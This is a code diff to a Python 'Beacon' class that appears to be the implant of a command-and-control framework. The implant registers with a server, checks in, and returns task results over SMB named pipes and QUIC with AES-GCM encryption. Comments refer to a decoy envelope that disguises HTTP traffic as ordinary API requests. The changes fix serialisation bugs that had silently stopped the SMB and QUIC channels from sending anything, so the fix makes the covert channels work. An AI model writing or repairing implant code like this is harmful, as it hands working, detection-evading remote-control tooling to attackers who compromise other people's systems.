@@ -1410,6 +1410,21 @@ class Beacon:
     # ── Crypto ──
 
     def _encrypt(self, data: dict) -> str:
+        # The parameter is a dict and nothing else. Three callers used to
+        # hand this an already-serialised value, and both ways of being
+        # wrong were invisible: bytes raised TypeError from inside
+        # json.dumps and the caller's `except` discarded it, so the SMB and
+        # QUIC transports never put a byte on the wire; a str would have
+        # been serialised a second time, and the far side would have
+        # decrypted a string where it expected a dict, with no error
+        # anywhere. The type hint said dict all along -- this makes it true
+        # at the boundary, so a future caller finds out immediately.
+        # The message names the type and never the value: the argument is
+        # plaintext about to be encrypted.
+        if not isinstance(data, dict):
+            raise TypeError(
+                "_encrypt takes a dict, not %s -- pass the mapping, not a "
+                "serialised form of it" % type(data).__name__)
         plaintext = json.dumps(data, separators=(",", ":")).encode()
         nonce = os.urandom(12)
         ct = _aes_gcm_encrypt(self._key, nonce, plaintext)
@@ -2026,13 +2041,23 @@ class Beacon:
         if not sock:
             return None
         try:
-            agent = self._agent_id or self._implant_id
-            payload = self._encrypt(json.dumps({
-                "action": "beacon" if self._registered else "register",
-                "agent_id": agent,
-                **self._system_info(),
-            }).encode())
-            if not self._smb_write_pipe(sock, payload.encode() if isinstance(payload, str) else payload):
+            # No decoy envelope here. _wrap_payload exists to make an HTTP
+            # request body look like ordinary API traffic; a named pipe
+            # write carries raw bytes with no JSON body for an inspector to
+            # read, so the envelope would add length and buy nothing -- and
+            # the listener would have to unwrap it again.
+            #
+            # _system_info() carries both "id" (the implant id, always set)
+            # and "agent_id" (None until the server assigns one), so it is
+            # the only thing that needs to go in. There used to be an
+            # explicit "agent_id": self._agent_id or self._implant_id above
+            # the spread, which the spread then overwrote on every call --
+            # dead, and misleading about what identifies a beacon on first
+            # contact. _beacon_https builds its payload the same way.
+            payload = self._encrypt(dict(self._system_info(),
+                                         action="beacon" if self._registered
+                                         else "register"))
+            if not self._smb_write_pipe(sock, payload.encode()):
                 return None
             resp_data = self._smb_read_pipe(sock)
             if not resp_data:
@@ -2068,8 +2093,9 @@ class Beacon:
             }
             if data:
                 result["data"] = data
-            payload = self._encrypt(json.dumps(result).encode())
-            self._smb_write_pipe(sock, payload.encode() if isinstance(payload, str) else payload)
+            # Same reasoning as the check-in above: no envelope on a pipe.
+            payload = self._encrypt(result)
+            self._smb_write_pipe(sock, payload.encode())
             self._smb_read_pipe(sock)
         except Exception as e:
             logger.debug("SMB result send failed: %s", e)
@@ -2090,9 +2116,10 @@ class Beacon:
                 host, port = host.rsplit(":", 1)
                 port = int(port)
 
-            payload = self._encrypt(json.dumps(data).encode())
-            if isinstance(payload, str):
-                payload = payload.encode()
+            # No envelope on a datagram either: there is no HTTP body to
+            # disguise, and the frame header below already describes the
+            # length the receiver needs.
+            payload = self._encrypt(data).encode()
 
             # Frame: [4-byte length][payload]
             frame = struct.pack(">I", len(payload)) + payload
@@ -2152,12 +2179,12 @@ class Beacon:
             return None
 
     def _beacon_quic(self) -> Optional[dict]:
-        agent = self._agent_id or self._implant_id
-        return self._quic_send({
-            "action": "beacon" if self._registered else "register",
-            "agent_id": agent,
-            **self._system_info(),
-        })
+        # Same shape as _beacon_smb and _beacon_https: _system_info()
+        # already carries "id" and "agent_id", and an explicit agent_id
+        # above the spread was dead code.
+        return self._quic_send(dict(self._system_info(),
+                                    action="beacon" if self._registered
+                                    else "register"))
 
     def _send_result_quic(self, task_id: str, status: str, output: str,
                           data: Optional[dict] = None):
